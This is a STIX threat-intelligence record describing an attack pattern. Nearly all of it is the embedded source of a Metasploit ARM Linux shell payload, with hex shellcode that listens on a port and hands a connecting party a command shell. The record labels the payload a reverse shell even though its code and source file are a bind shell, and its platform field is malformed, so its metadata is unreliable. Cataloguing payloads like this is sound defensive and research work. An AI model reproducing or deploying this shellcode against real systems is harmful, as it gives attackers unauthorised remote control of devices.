{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2eac34d3-0e34-417c-b8e7-989b845c4af1",
    "created": "2024-08-14T16:33:19.450149Z",
    "modified": "2024-08-14T16:33:19.450153Z",
    "name": "Linux Command Shell, Reverse TCP Inline",
    "description": "Connect to target and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/armle/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 208\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Reverse TCP Inline',\n      'Version'       => '',\n      'Description'   => 'Connect to target and spawn a command shell',\n      'Author'        => ['civ', 'hal'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_ARMLE,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'RHOST'    => [ 172, 'ADDR' ],\n              'LPORT'    => [ 170, 'n' ],\n            },\n          'Payload' =>\n            [\n              # socket\n              0xe3a00002, # mov     r0, #2\n              0xe3a01001, # mov     r1, #1\n              0xe3a02006, # mov     r2, #6\n              0xe3a07001, # mov     r7, #1\n              0xe1a07407, # lsl     r7, r7, #8\n              0xe2877019, # add     r7, r7, #25\n              0xef000000, # svc     0x00000000\n              0xe1a06000, # mov     r6, r0\n\n              # bind\n              0xe28f1080, # 1dr     r1, pc, #128\n              0xe3a02010, # mov     r2, #16\n              0xe3a07001, # mov     r7, #1\n              0xe1a07407, # lsl     r7, r7, #8\n              0xe287701a, # add     r7, r7, #26\n              0xef000000, # svc     0x00000000\n\n              # listen\n              0xe1a00006, # mov     r0, r6\n              0xe3a07001, # mov     r7, #1\n              0xe1a07407, # lsl     r7, r7, #8\n              0xe287701c, # add     r7, r7, #28\n              0xef000000, # svc     0x00000000\n\n              # accept\n              0xe1a00006, # mov     r0, r6\n              0xe0411001, # sub     r1, r1, r1\n              0xe0422002, # sub     r2, r2, r2\n              0xe3a07001, # mov     r7, #1\n              0xe1a07407, # lsl     r7, r7, #8\n              0xe287701d, # add     r7, r7, #29\n              0xef000000, # svc     0x00000000\n\n              # dup\n              0xe1a06000, # mov     r6, r0\n              0xe3a01002, # mov     r1, #2\n              0xe1a00006, # mov     r0, r6\n              0xe3a0703f, # mov     r7, #63 ; 0x3f\n              0xef000000, # svc     0x00000000\n              0xe2511001, # subs    r1, r1, #1\n              0x5afffffa, # bpl     8c <.text+0x8c>\n\n              # execve(\"/system/bin/sh\", args, env)\n              0xe28f0024, # add     r0, pc, #36     ; 0x24\n              0xe0244004, # eor     r4, r4, r4\n              0xe92d0010, # push    {r4}\n              0xe1a0200d, # mov     r2, sp\n              0xe28f4024, # add     r4, pc, #36     ; 0x10\n              0xe92d0010, # push    {r4}\n              0xe1a0100d, # mov     r1, sp\n              0xe3a0700b, # mov     r7, #11 ; 0xb\n              0xef000000, # svc     0x00000000\n\n              # <af>:\n              0x04290002, # .word   0x5c110002 @ port: 4444 , sin_fam = 2\n              0x0101a8c0, # .word   0x0101a8c0 @ ip: 192.168.1.1\n\n              # <shell>:\n              0x00000000, # .word   0x00000000 ; the shell goes here!\n              0x00000000, # .word   0x00000000\n              0x00000000, # .word   0x00000000\n              0x00000000, # .word   0x00000000\n\n              # <arg>:\n              0x00000000, # .word   0x00000000 ; the args!\n              0x00000000, # .word   0x00000000\n              0x00000000, # .word   0x00000000\n              0x00000000, # .word   0x00000000\n\n            ].pack(\"V*\")\n        }\n      ))\n\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('SHELL', [ true, \"The shell to execute.\", \"/bin/sh\" ]),\n        OptString.new('ARGV0', [ false, \"argv[0] to pass to execve\", \"sh\" ]) # mostly used for busybox\n      ])\n  end\n\n  def generate(_opts = {})\n    p = super\n\n    sh = datastore['SHELL']\n    if sh.length >= 16\n      raise ArgumentError, \"The specified shell must be less than 16 bytes.\"\n    end\n    p[176, sh.length] = sh\n\n    arg = datastore['ARGV0']\n    if arg\n      if arg.length >= 16\n        raise ArgumentError, \"The specified argv[0] must be less than 16 bytes.\"\n      end\n      p[192, arg.length] = arg\n    end\n\n    p\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}